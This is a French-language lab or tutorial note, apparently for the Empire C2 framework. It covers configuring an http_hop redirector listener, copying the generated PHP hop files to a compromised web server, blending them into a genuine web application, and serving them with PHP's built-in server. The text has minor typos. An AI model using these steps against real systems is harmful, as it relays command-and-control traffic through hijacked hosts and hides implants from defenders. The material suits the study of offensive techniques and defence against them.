#HopListerners
Une fois créé, cela créera un ensemble de .php fichiers qui doivent être téléchargés sur le jumpserver (notre serveur Web compromis) et servis par un serveur HTTP.

Nous avons besoin de:

- **Un RedirectListener** : il s'agit d'un écouteur régulier vers lequel transférer tous les agents reçus. Assurez-vous cependant que cela corresponde au nom d'un listener déjà actif !

- **Un hôte** : l'adresse IP du serveur Web compromis

- **Un port** : c'est le port qui sera utilisé pour le serveur web hébergeant nos fichiers hop. Choisissez un port au hasard ici (au-dessus de 15 000)

```sh
uselistener http_hop
set RedirectListener http
set Host COMPROMISED_IP
set Port 9001
execute
```

Cela aura écrit une variété de fichiers dans un nouveau répertoire `/tmp/http_hop` de notre machine attaquante.

- Nous devrons répliquer cette structure de fichiers sur notre serveur de saut (le serveur Web compromis) lorsque nous servirons les fichiers. 

- Notez que ces fichiers ( `news.php`, `admin/get.php` et `login/process.php`) ne sembleraient pas déplacés parmi les fichiers d'application Web authentiques et pourraient en effet être facilement fusionnés discrètement dans une application Web existante.

Commençons par générer un stager qui vas pointer son listener vers `http_hop`.

Quelle que soit la méthode choisie, enregistrez la commande fournie quelque part et ne l'exécutez pas encore. Nous en aurons besoin une fois que nous aurons configuré les fichiers hop sur le serveur de saut.

> Installons ce serveur de saut !
- Tout d'abord, dans le répertoire /tmp du serveur Web compromis `mkdir /tmp/hop-folder`
- Transférez le contenu du `/tmp/http_ho` du prépertoire KALI vers ce répertoire `/tmp/hop-folder` sur le serveur cible. 
- Un bon moyen de le faire est de compresser le contenu du répertoire

```sh
cd /tmp/http_hop && zip -r hop.zip *

# puis de transférer le fichier zip  et le decompresr
unzip hop.zip
```

 Nous devons maintenant servir les fichiers sur le port que nous avons choisi lors de la génération de l'écouteur `http_hop`

```sh
php -S 0.0.0.0:{PORT} &>/dev/null &
```

